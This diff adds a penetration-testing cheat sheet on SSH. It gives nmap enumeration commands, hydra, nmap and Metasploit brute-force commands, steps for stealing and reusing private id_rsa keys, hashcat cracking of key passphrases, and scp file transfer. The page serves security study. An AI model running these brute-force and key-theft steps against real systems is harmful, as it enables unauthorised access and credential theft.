@@ -1,0 +1,210 @@
+---
+title: SSH Enumeration & Exploitation
+description: Enumerating SSH services, brute-forcing credentials, stealing and cracking private keys, and transferring files.
+draft: false
+tags:
+  - SSH
+  - Reconnaissance
+  - T1110
+  - CredentialAccess
+---
+
+<Callout type="info" title="Concept Overview">
+Secure Shell (SSH) is a cryptographic network protocol for operating network services securely over an unsecured network. Misconfigurations, weak credentials, or stolen private keys can lead to full system compromise.
+</Callout>
+
+!["](/docs/Asset/doran.jpg)
+
+```mermaid
+%%{init: {'theme': 'base', 'themeVariables': { 'background': '#050505', 'primaryColor': '#111118', 'edgeLabelBackground':'#050505', 'primaryTextColor': '#ffffff', 'primaryBorderColor': '#FF003C', 'lineColor': '#FF003C', 'fontFamily': 'monospace' }}}%%
+flowchart TD
+    A["SSH Port 22 Open"] --> B["Scan & Enumerate"]
+    B --> C["Brute Force Creds"]
+    B --> D["Find .ssh Directory"]
+    D --> E["Steal Private Key (id_rsa)"]
+    E --> F{"Key Encrypted?"}
+    F -- Yes --> G["Crack Passphrase (Hashcat)"]
+    F -- No --> H["Login with Key"]
+    G --> H
+    H --> I["Root Shell / Lateral Movement"]
+    
+    classDef default fill:#111118,stroke:#585b70,stroke-width:1px,color:#ffffff;
+    classDef attacker fill:#2a0008,stroke:#FF003C,stroke-width:2px,color:#FF003C;
+    classDef action fill:#1a1a1a,stroke:#89b4fa,stroke-width:2px,color:#89b4fa;
+    classDef exec fill:#1a1a1a,stroke:#D500F9,stroke-width:2px,color:#D500F9;
+    
+    class A,B action;
+    class C,D,E attacker;
+    class F,G action;
+    class H,I exec;
+```
+
+---
+
+## Basic Scanning & Enumeration
+
+<Callout type="warning" title="Windows vs. Linux SSH Enumeration">
+* **Linux:** SSH is native and runs as `sshd`. Look for `/home/user/.ssh/` directories.
+* **Windows:** Usually OpenSSH for Windows or WSL. Keys are typically stored in `C:\Users\<username>\.ssh\`. The service runs as `sshd.exe`.
+</Callout>
+
+<Tabs>
+  <Tab title="Nmap Scanning">
+    ```bash
+    # Enumerate supported algorithms
+    nmap -p 22 --script ssh2-enum-algos x.x.x.x
+
+    # Banner grabbing (Service Version)
+    nc x.x.x.x 22 
+    nmap -sV -p 22 --script banner x.x.x.x
+
+    # Extract Host Keys
+    nmap -p 22 --script ssh-hostkey --script-args ssh_host.key=full x.x.x.x
+
+    # Check supported authentication methods (e.g., password, publickey)
+    nmap -p 22 --script ssh-auth-methods --script-args ssh.user='*' x.x.x.x
+    ```
+  </Tab>
+  <Tab title="Manual Banner Grabbing">
+    ```bash
+    # Connect and grab banner
+    ssh root@172.20.10.1
+    ```
+  </Tab>
+</Tabs>
+
+---
+
+## Brute Forcing Credentials
+
+<Callout type="danger" title="Credential Brute Force (MITRE ATT&CK T1110)">
+Attempting to guess SSH credentials. Be careful with account lockouts.
+</Callout>
+
+<Tabs>
+  <Tab title="Hydra">
+    ```bash
+    hydra -t 4 -L user.txt -P rockyou.txt x.x.x.x ssh
+    ```
+  </Tab>
+  <Tab title="Nmap">
+    ```bash
+    nmap -p 22 --script ssh-brute --script-args userdb=/home/adolf/user.txt x.x.x.x
+    ```
+  </Tab>
+  <Tab title="Metasploit">
+    ```ruby
+    msfconsole -q
+    msf5> use auxiliary/scanner/ssh/ssh_enumusers
+    msf5> use auxiliary/scanner/ssh/ssh_login
+    msf5> set rhost x.x.x.x
+    msf5> set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
+    msf5> set STOP_ON_SUCCESS true
+    msf5> set verbose true
+    msf5> exploit
+    ```
+  </Tab>
+</Tabs>
+
+---
+
+## Stealing & Abusing SSH Keys
+
+<Callout type="info" title="What are we looking for?">
+If you compromise a Linux or Windows machine, you should immediately check for SSH keys. Private keys allow you to log in to other machines without knowing the target user's password.
+</Callout>
+
+### Where to look for `.ssh` directories
+
+* **Linux:** `~/.ssh/` (e.g., `/home/adolf/.ssh/`, `/root/.ssh/`)
+* **Windows:** `C:\Users\<username>\.ssh\`
+
+### Key File Types
+
+* `id_rsa` / `id_ecdsa`: The **Private Key** (The prize. You need this to log in).
+* `id_rsa.pub`: The Public Key (Useless for logging in, but tells you what key pairs exist).
+* `authorized_keys`: Contains a list of public keys allowed to log into *this* machine. Useful for lateral movement mapping.
+* `known_hosts`: A list of IP addresses/Hostnames this machine has connected to before (targets for lateral movement).
+
+### How to Login with a Stolen Key
+
+<Steps>
+  <Step title="Step 1: Download the Private Key to your machine">
+    ```bash
+    # On your attacker machine, save the stolen key contents to a file
+    nano id_rsa
+    # Paste the key contents (starts with -----BEGIN OPENSSH PRIVATE KEY-----)
+    ```
+  </Step>
+  <Step title="Step 2: Fix Permissions">
+    <Callout type="warning">
+    SSH will reject the key if the file permissions are too open.
+    </Callout>
+    ```bash
+    chmod 600 id_rsa
+    ```
+  </Step>
+  <Step title="Step 3: Login">
+    ```bash
+    # Syntax: ssh -i <private_key> <username>@<IP>
+    ssh -i id_rsa root@172.20.10.1
+    ```
+    *Note: You still need to know the target username. If you don't know it, try `root`, `admin`, or usernames found in `/etc/passwd`.*
+  </Step>
+</Steps>
+
+---
+
+## Cracking SSH Key Passphrases with Hashcat
+
+<Callout type="danger" title="Encrypted Private Keys">
+If the private key is protected with a passphrase, `ssh -i id_rsa` will prompt you for it. Instead of guessing manually, you can crack the passphrase offline using Hashcat.
+</Callout>
+
+<Steps>
+  <Step title="Step 1: Convert Key to Hashcat Format">
+    You need the `ssh2john` script (usually bundled with John the Ripper) to extract the hash from the key.
+    ```bash
+    # Locate ssh2john (Kali Linux)
+    locate ssh2john
+    
+    # Convert the private key to a hash format
+    python2 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+    ```
+  </Step>
+  <Step title="Step 2: Crack with Hashcat">
+    <Callout type="info">
+    Hashcat Mode `22421` is specifically for SSH Private Keys (RSA/ECDSA/ED25519).
+    </Callout>
+    ```bash
+    # Syntax: hashcat -m <mode> <hash_file> <wordlist>
+    hashcat -m 22421 id_rsa.hash /usr/share/wordlists/rockyou.txt
+    ```
+  </Step>
+  <Step title="Step 3: Login with Passphrase">
+    Once Hashcat cracks the passphrase, you can log in.
+    ```bash
+    ssh -i id_rsa root@172.20.10.1
+    # Enter passphrase for key 'id_rsa': (type the cracked password)
+    ```
+  </Step>
+</Steps>
+
+---
+
+## File Transfer (SCP)
+
+<Callout type="tip" title="Secure Copy Protocol (SCP)">
+Transfer files securely over SSH using the `scp` command.
+</Callout>
+
+```bash
+# Get a file FROM the remote machine to your local machine
+scp username@hostname:'/path/to/remote/file' .
+
+# Drop (upload) a file FROM your local machine TO the remote machine
+scp local_file.txt username@hostname:'C:\Users\share'
+
+# Transfer a directory recursively
+scp -r local_folder username@hostname:/remote/path/
+```
